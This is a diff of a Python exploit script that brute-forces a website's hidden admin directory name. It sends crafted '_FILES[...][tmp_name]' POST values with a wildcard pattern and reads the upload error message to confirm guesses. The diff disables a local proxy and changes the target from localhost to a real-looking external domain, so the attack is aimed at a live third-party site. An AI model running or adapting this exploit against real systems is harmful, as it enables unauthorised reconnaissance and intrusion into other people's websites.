@@ -9,15 +9,15 @@
 import requests
 import itertools
 
-proxies = {
-    "http": "socks5://127.0.0.1:1080",
-    'https': 'socks5://127.0.0.1:1080'
-}
+# proxies = {
+#     "http": "socks5://127.0.0.1:1080",
+#     'https': 'socks5://127.0.0.1:1080'
+# }
 
 characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
 back_dir = ""
 flag = 0
-url = "http://127.0.0.1/"
+url = "http://www.yx-tongxunlu.com/"
 data = {
     "_FILES[mochazz][tmp_name]" : "./{p}<</images/adminico.gif",
     "_FILES[mochazz][name]" : 0,
@@ -32,7 +32,7 @@ for num in range(1,7):
         pre = ''.join(list(pre))
         data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=pre)
         print("testing",pre)
-        r = requests.post(url,data=data,proxies=proxies)
+        r = requests.post(url,data=data)#,proxies=proxies)
         if "Upload filetype not allow !" not in r.text and r.status_code == 200:
             flag = 1
             back_dir = pre
